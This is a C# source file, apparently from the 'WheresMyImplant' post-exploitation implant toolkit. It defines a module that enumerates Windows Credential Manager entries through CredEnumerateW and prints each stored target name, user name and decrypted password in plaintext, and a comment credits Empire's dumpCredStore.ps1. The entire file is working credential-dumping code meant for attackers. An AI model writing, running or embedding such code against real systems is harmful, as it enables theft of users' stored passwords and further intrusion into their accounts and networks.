using System;
using System.Runtime.InteropServices;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;

namespace WheresMyImplant
{
    class Vault : Base
    {
        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Vault() : base()
        {
        }

        ////////////////////////////////////////////////////////////////////////////////
        // 
        ////////////////////////////////////////////////////////////////////////////////
        internal void EnumerateCredentials()
        {
            Int32 count = 0;
            IntPtr hCredential;
            if (!advapi32.CredEnumerateW(null, 0, out count, out hCredential))
            {
                Console.WriteLine("[-] CredEnumerateW Failed, Read {0}", count);
                return;
            }

            try
            {
                ReadCredentials(hCredential, count);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
            finally
            {
                advapi32.CredFree(hCredential);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // 
        ////////////////////////////////////////////////////////////////////////////////
        private void ReadCredentials(IntPtr hCredential, Int32 count)
        {
            WinCred._CREDENTIAL[] credentialObject = new WinCred._CREDENTIAL[count];
            for (Int32 i = 0; i < count; i++)
            {
                IntPtr hTemp = Marshal.ReadIntPtr(hCredential, i * IntPtr.Size);
                try
                {

                    WinCred._CREDENTIAL credential = (WinCred._CREDENTIAL)Marshal.PtrToStructure(hTemp, typeof(WinCred._CREDENTIAL));
                    Console.WriteLine("{0,-20} {1,-20}", "Flags", credential.Flags);
                    Console.WriteLine("{0,-20} {1,-20}", "Type", credential.Type);
                    Console.WriteLine("{0,-20} {1,-20}", "TargetName", PrintIntPtr(credential.TargetName));
                    Console.WriteLine("{0,-20} {1,-20}", "Comment", PrintIntPtr(credential.Comment));

                    //https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1
                    Int64 lastWritten = credential.LastWritten.dwHighDateTime;
                    lastWritten = (lastWritten << 32) + credential.LastWritten.dwLowDateTime;
                    Console.WriteLine("{0,-20} {1,-20}", "LastWritten", DateTime.FromFileTime(lastWritten));

                    Console.WriteLine("{0,-20} {1,-20}", "Password Size", credential.CredentialBlobSize);
                    String credentialBlob;
                    if (0 < credential.CredentialBlobSize)
                    {
                        credentialBlob = Marshal.PtrToStringUni(credential.CredentialBlob, (Int32)credential.CredentialBlobSize / 2);
                    }
                    else
                    {
                        credentialBlob = PrintIntPtr(credential.CredentialBlob);
                    }

                    Console.WriteLine("{0,-20} {1,-20}", "Password", credentialBlob);
                    Console.WriteLine("{0,-20} {1,-20}", "Persist", credential.Persist);
                    Console.WriteLine("{0,-20} {1,-20}", "AttributeCount", credential.AttributeCount);
                    Console.WriteLine("{0,-20} {1,-20}", "Attributes", credential.Attributes);
                    Console.WriteLine("{0,-20} {1,-20}", "TargetAlias", PrintIntPtr(credential.TargetAlias));
                    Console.WriteLine("{0,-20} {1,-20}", "UserName", PrintIntPtr(credential.UserName));
                    Console.WriteLine("");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] {0}", ex.Message);
                }
                finally
                {
                    kernel32.CloseHandle(hTemp);
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static String PrintIntPtr(IntPtr input)
        {
            String output = String.Empty;
            if (IntPtr.Zero == input)
            {
                return output;
            }

            try
            {
                output = Marshal.PtrToStringUni(input);
            }
            catch (AccessViolationException error)
            {
                output = error.ToString();
            }
            return output;
        }
    }
}